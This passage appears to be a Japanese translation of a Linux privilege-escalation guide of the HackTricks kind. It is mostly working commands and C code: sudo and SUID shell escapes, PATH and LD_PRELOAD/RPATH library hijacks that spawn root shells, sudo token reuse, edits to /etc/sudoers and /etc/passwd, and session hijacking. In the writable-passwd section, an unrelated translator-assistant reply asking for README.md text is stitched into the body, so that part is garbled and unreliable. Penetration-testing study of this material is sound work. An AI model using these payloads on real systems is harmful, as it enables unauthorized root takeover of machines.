<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus communication を enumerate して exploit する方法を学ぶ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate してマシンの位置を把握するのは常に興味深い。

### 一般的な enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

アクセスする前にやり取りできなかったマシン上で動作している network services を常に確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic ができるか確認してください。できれば、いくつかの資格情報を取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**who**であるか、どの**privileges**を持っているか、システムにどの**users**が存在するか、どのアカウントが**login**できるか、どのアカウントが**root privileges**を持っているかを確認する:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大きな UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限昇格できるバグの影響を受けていました。詳しくは [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**悪用するには**: **`systemd-run -t /bin/bash`**

### グループ

root 権限を与える可能性のある**グループのメンバー**かどうか確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であれば、クリップボード内に興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境のパスワードを**知っている**場合は、そのパスワードを使って**各ユーザーにログインを試みてください**。

### Su Brute

大量のノイズを気にしない場合で、対象のコンピュータに `su` と `timeout` バイナリが存在するなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーのブルートフォースを試みます。

## 書き込み可能な $PATH の悪用

### $PATH

もし **$PATH のいずれかのフォルダに書き込める** ことが分かったら、別のユーザー（理想的には root）が実行するコマンド名で、**書き込み可能なフォルダ内に backdoor を作成する**ことで権限を昇格できる可能性があります。ただし、そのコマンドが $PATH 内で**あなたの書き込み可能なフォルダより前にあるフォルダから読み込まれない**ことが条件です。

### SUDO and SUID

sudo で実行できるコマンドが許可されているか、またはファイルに suid ビットが設定されている場合があります。確認するには次を使用してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の **予期しないコマンドはファイルを読み書きしたり、コマンドを実行することさえあります。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定により、ユーザーがパスワードを知らなくても別のユーザーの権限でコマンドを実行できる場合がある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例ではユーザー`demo`が`root`として`vim`を実行できるため、`root`ディレクトリにssh keyを追加するか`sh`を呼び出すことでシェルを取得するのは簡単です。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、ユーザーが何かを実行する際に**set an environment variable**ことを可能にします:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirer に基づく**もので、**脆弱**であり、スクリプトを root として実行する際に任意の python library をロードするための**PYTHONPATH hijacking**が可能でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Why it works: 非対話型シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを source（読み込み）します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。`BASH_ENV` が sudo によって保持されている場合、あなたのファイルは root 権限で source されます。

- Requirements:
- 実行できる sudo ルール（非対話的に `/bin/bash` を呼び出すターゲット、または任意の bash スクリプト）。
- `env_keep` に `BASH_ENV` が含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `env_keep` から `BASH_ENV`（および `ENV`）を削除し、`env_reset` を推奨します。
- sudo によって許可されたコマンドに対する shell ラッパーを避け、最小限のバイナリを使用してください。
- preserved env vars が使用された場合に sudo の I/O ロギングとアラートを検討してください。

### Sudo 実行バイパス経路

**Jump** して他のファイルを読むか、**symlinks** を使用します。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使用されている (\*) と、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo コマンド / SUID バイナリでコマンドパスが指定されていない場合

もし**sudo の権限**が単一のコマンドに対して**パスを指定せずに**与えられている場合: _hacker10 ALL= (root) less_、PATH 変数を変更することでこれを悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
このテクニックは、**suid** バイナリが **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**) 場合にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

もし **suid** バイナリが **executes another command specifying the path** 場合は、suid ファイルが呼び出しているコマンド名と同じ名前の関数を作成して、**export a function** を試すことができます。

例えば、もし suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出している場合、その関数を作成して export してみてください:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suid binary を呼び出すと、この関数が実行されます

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、ローダが標準 C ライブラリ（`libc.so`）を含む他のすべてよりも先に読み込む、1つ以上の共有ライブラリ（.so ファイル）を指定するために使われます。この処理はライブラリのプリロードと呼ばれます。

しかし、この機能が特に **suid/sgid** 実行ファイルで悪用されるのを防ぎ、システムのセキュリティを維持するために、システムはいくつかの条件を強制します：

- ローダは実ユーザーID（_ruid_）が実効ユーザーID（_euid_）と一致しない実行ファイルに対して **LD_PRELOAD** を無視します。
- suid/sgid の実行ファイルについては、標準パスにありかつ同様に suid/sgid になっているライブラリのみがプリロードされます。

Privilege escalation は、`sudo` でコマンドを実行でき、`sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合に発生する可能性があります。この設定により、`sudo` でコマンドを実行しても **LD_PRELOAD** 環境変数が保持され認識されるため、特権昇格して任意のコードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
次の名前で保存: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に **コンパイルする** には:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行します
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** env variable を制御している場合、同様の privesc が悪用される可能性があります。これは攻撃者がライブラリを検索するパスを制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

異常と思われる **SUID** 権限を持つバイナリを見つけたら、**.so** ファイルを正しく読み込んでいるか確認するのが良い習慣です。以下のコマンドを実行して確認できます：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、悪用の可能性が考えられます。

これを悪用するには、Cファイル、例えば _"/path/to/.config/libcalc.c"_ を作成し、以下のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルのパーミッションを操作し、権限昇格したシェルを実行することで特権を取得することを目的としています。

上記の C ファイルを共有オブジェクト（.so）ファイルにコンパイルするには、次のようにします：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID バイナリを実行すると exploit がトリガーされ、潜在的にシステムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能な folder から library を読み込む SUID binary を見つけたので、その folder に必要な名前で library を作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
つまり、生成したライブラリには `a_function_name` という名前の関数が含まれている必要があります。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリのキュレーションされた一覧です。 [**GTFOArgs**](https://gtfoargs.github.io/) は同様のもので、コマンドに **only inject arguments** できる場合を対象としています。

このプロジェクトは、Unix バイナリの正当な機能のうち、restricted shells からの脱出、権限の昇格・維持、ファイル転送、bind and reverse shells の生成、その他の post-exploitation tasks を容易にするために悪用できるものを収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、任意の sudo ルールを悪用できるかどうかを調べることができます。

### Reusing Sudo Tokens

パスワードは分からないが **sudo access** がある場合、sudo コマンドの実行を待ち、そのセッショントークンをハイジャックすることで権限を昇格できます（wait for a sudo command execution and then hijacking the session token）。

Requirements to escalate privileges:

- 既にユーザー "_sampleuser_" としてシェルを持っている
- "_sampleuser_" は **used `sudo`** により **last 15mins** の間に何かを実行している（デフォルトでは、これはパスワードを入力せずに `sudo` を使える sudo トークンの有効期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 である
- `gdb` にアクセスできる（アップロード可能であること）

(一時的に `ptrace_scope` を有効化するには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を使用するか、`/etc/sysctl.d/10-ptrace.conf` を恒久的に変更して `kernel.yama.ptrace_scope = 0` を設定します)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ に **root 所有で setuid が付いた** sh shell を作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、**sudo tokens を永続化し、すべてのユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

もしフォルダ自体、またはフォルダ内に作成されたいずれかのファイルに対して**write permissions**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使って**create a sudo token for a user and PID**できます。\
例えば、ファイル_/var/run/sudo/ts/sampleuser_を上書きでき、かつそのユーザーとしてPID 1234のshellを持っている場合、以下を実行することでパスワードを知らなくても**obtain sudo privileges**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるかとその方法を設定します。これらのファイル **デフォルトでは user root と group root のみが読み取り可能です**。\
**もし**このファイルを**読み取る**ことができれば、**興味深い情報を入手できる**可能性があり、任意のファイルに**書き込む**ことができれば**escalate privileges**できます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みができるなら、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として、OpenBSD 用の `doas` などがあります。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もしある**ユーザーが通常マシンに接続して権限昇格のために `sudo` を使う**ことが分かっており、そのユーザーコンテキストでシェルを得ている場合、root としてあなたのコードを実行したあとにそのユーザーのコマンドを実行する新しい sudo 実行ファイルを作成できます。その後、ユーザーコンテキストの $PATH（例えば .bash_profile に新しいパスを追加する）を変更すれば、ユーザーが sudo を実行したときにあなたの sudo 実行ファイルが実行されます。

ユーザーが別のシェル（bash ではない）を使っている場合、別のファイルを修正して新しいパスを追加する必要があります。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を修正します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

あるいは次のようなコマンドを実行する:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルの出所**を示します。通常、このファイルには次の行が含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは、**他のフォルダを指し**、そこで**ライブラリ**が**検索されます**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**つまり、システムは `/usr/local/lib` 内でライブラリを検索します。**

もし何らかの理由で、指定されたパス（`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` の設定ファイルが指す任意のフォルダ）に**ユーザーが書き込み権限を持っている**場合、権限昇格できる可能性があります.\
以下のページで**この誤設定を悪用する方法**を参照してください：


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されているとおり、この場所からプログラムにより使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に悪意のあるライブラリを作成します: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 権限 (Capabilities)

Linux capabilities はプロセスに対して利用可能な root 権限の**サブセット**を提供します。これは root の権限を**より小さく識別可能な単位に分割する**ことを意味します。これらの各単位は独立してプロセスに付与でき、権限の全体集合が縮小されることで悪用リスクを低減します。\
次のページを読んで **capabilities とその悪用方法について詳しく学んでください**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## ディレクトリの権限

ディレクトリでは、**"execute"** ビットは該当ユーザーが「**cd**」してフォルダに入れることを意味します。\  
**"read"** ビットはユーザーがファイルを一覧表示できることを意味し、**"write"** ビットはユーザーが新しいファイルを作成および削除できることを意味します。

## ACLs

Access Control Lists (ACLs) は任意の権限の第二階層を表し、従来の ugo/rwx パーミッションを**上書き**することができます。これらの権限は、所有者でもグループの一員でもない特定のユーザーに対してアクセスを許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの**粒度により、より正確なアクセス管理が可能になります**。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**ユーザー "kali" にファイルに対する read と write 権限を付与する:**
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システムから特定の ACLs を持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 開いている shell sessions

**old versions**では、別のユーザー（**root**）の**shell** sessionを**hijack**できることがあります。\
**newest versions**では、**your own user**のscreen sessionsにのみ**connect**できるようになります。 ただし、session内で**興味深い情報**が見つかることがあります。

### screen sessions hijacking

**screen sessions を一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチ**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **old tmux versions** の問題でした。非特権ユーザーとして、root が作成した tmux (v2.1) セッションをハイジャックできませんでした。

**tmux セッションの一覧**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチ**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
例として **Valentine box from HTB** を確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebianベースのシステム（Ubuntu、Kubuntuなど）で生成されたすべての SSL および SSH キーはこのバグの影響を受ける可能性があります。\
このバグはそれらの OS で新しい ssh キーを作成するときに発生します。**32,768 通りしか存在しなかったため**、すべての可能性を計算することができ、**ssh 公開鍵を持っていれば対応する秘密鍵を探すことができます**。計算済みの候補はここで見つかります: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH の注目すべき設定値

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、空のパスワード文字列を持つアカウントでのログインをサーバが許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh を使ってログインできるかどうかを指定します。デフォルトは `no` です。考えられる値:

- `yes`: root はパスワードおよび秘密鍵でログインできます
- `without-password` or `prohibit-password`: root は秘密鍵でのみログインできます
- `forced-commands-only`: root は秘密鍵でのみログインでき、かつ commands オプションが指定されている場合に限ります
- `no` : 許可しない

### AuthorizedKeysFile

ユーザ認証に使用できる公開鍵を含むファイルを指定します。%h のようなトークンを含めることができ、これはホームディレクトリに置換されます。**絶対パスを指定できます**（`/` から始まる）または**ユーザのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding は、サーバー上に（passphrasesなしで）キーを残しておく代わりに **use your local SSH keys instead of leaving keys** ことを可能にします。つまり、ssh を介して **jump** **to a host** し、そこから **jump to another** host へ、**initial host** にある **key** を **using** して移動できます。

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

The file `/etc/ssh_config` can **上書き** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **あなたはそれを悪用して権限昇格できる可能性があります**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### Profiles files

The file `/etc/profile` and the files under `/etc/profile.d/` are **ユーザーが新しいシェルを実行したときに実行されるスクリプト**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
もし不審なプロフィールスクリプトが見つかった場合、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow ファイル

OSによっては `/etc/passwd` および `/etc/shadow` ファイルが別名になっている場合やバックアップが存在する場合があります。したがって、**それらをすべて見つけ出し**、ファイルを**読み取れるか確認して**、ファイル内に**ハッシュが存在するかどうか**を確認することをお勧めします:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内に**password hashes**が含まれていることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、以下のコマンドのいずれかでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
README.md の元の英語テキストを送ってください。該当箇所を日本語に翻訳し、元の Markdown/HTML 構文はそのまま保持して返します。

それと、「Then add the user `hacker` and add the generated password.」について確認です。翻訳内に以下のどれを追加すればよいですか？
1. `hacker` ユーザーを作成するためのコマンド例（例: useradd と passwd の手順）を追加する。  
2. `hacker` ユーザーを作成するコマンドと、こちらで生成したパスワード文字列をドキュメントに明示的に追記する。  
3. 上記両方（コマンド例と生成パスワードの併記）。

パスワードをこちらで生成する場合、希望の長さと文字種を教えてください（例: 16 文字、英数字+記号）。指定がなければ安全なランダム 16 文字（英数字+記号）を生成して挿入します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを使って `hacker:hacker` を利用できます。

あるいは、以下の行を使用してパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変わっています。

いくつかの**機密ファイルに書き込みができるか**を確認するべきです。例えば、いくつかの**サービス設定ファイル**に書き込みできますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバを実行していて、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる** 場合、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
あなたの backdoor は次回 tomcat を起動したときに実行されます。

### フォルダの確認

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読み取れないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/所有ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
